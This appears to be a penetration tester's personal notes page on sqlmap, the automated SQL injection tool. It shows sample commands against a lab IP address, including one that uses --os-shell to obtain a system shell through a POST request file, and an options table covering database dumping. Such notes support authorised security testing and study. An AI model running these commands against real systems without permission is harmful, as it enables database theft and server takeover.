---
tags:
  - "#type/tool"
Link: https://sqlmap.org/
Purpose: Automatic SQL injection and database takeover tool
---
# Info
Automatically scans webpages for SQL injection vulnerabilities and provides features to exploit them. 

**Hint:** for [[2 Tech-Specifics/Database/PostgreSQL|PostgreSQL]] databases `-dbs` will not list database instances, but instead the schemas inside a database
# Usage
[Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) 
when using GET requests:
`sqlmap -u http://192.168.10.20/sqlplayground.php?user=1 -p user`

when using POST requests:
1. make a request and store it in a file
2. use the stored request with sql map:
`sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`

common options:
| Option | Purpose |
|----------|--------------|
| `-u` | full url too test, including parameters |
| `-r` | template request |
| `-p` | parameter to test |
| `--dump` | dump the database |
| `--os-shell` | pop a system shell |
| `--web-root` | web server document root |
# Snippets